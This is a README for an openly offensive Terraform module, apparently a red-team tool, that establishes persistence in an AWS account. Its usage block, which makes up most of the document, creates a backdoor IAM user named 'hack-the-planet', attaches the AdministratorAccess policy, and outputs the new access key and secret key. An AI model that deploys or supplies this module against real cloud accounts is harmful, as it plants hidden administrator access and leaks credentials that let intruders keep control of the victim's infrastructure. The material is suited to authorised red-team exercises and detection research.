# AWS IAM Create User Persistence

![OffensiveTerraform](https://img.shields.io/badge/hack-success)
![OffensiveTerraform](https://img.shields.io/badge/offensive-terraform-blueviolet)
![OffensiveTerraform](https://img.shields.io/badge/aws-important)

Offensive Terraform module which creates an IAM user and an access key then attaches managed IAM Policy to an IAM user.

![Attack Diagram](https://raw.githubusercontent.com/offensive-terraform/terraform-aws-iam-create-user-persistence/master/diagram.jpg)

## Usage
```
module "iam-create-user-persistence" {
  source  = "offensive-terraform/iam-create-user-persistence/aws"
  version = "0.1.0"

  user_name  = "hack-the-planet"
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

output "aws_iam_user" {
  value = module.iam-create-user-persistence.aws_iam_user
}

output "aws_iam_user_policy_arn" {
  value = module.iam-create-user-persistence.aws_iam_user_policy_arn
}

output "access_key" {
  value = module.iam-create-user-persistence.access_key
}

output "secret_key" {
  value = module.iam-create-user-persistence.secret_key
}
```
## Author
Module managed by https://github.com/iganbold
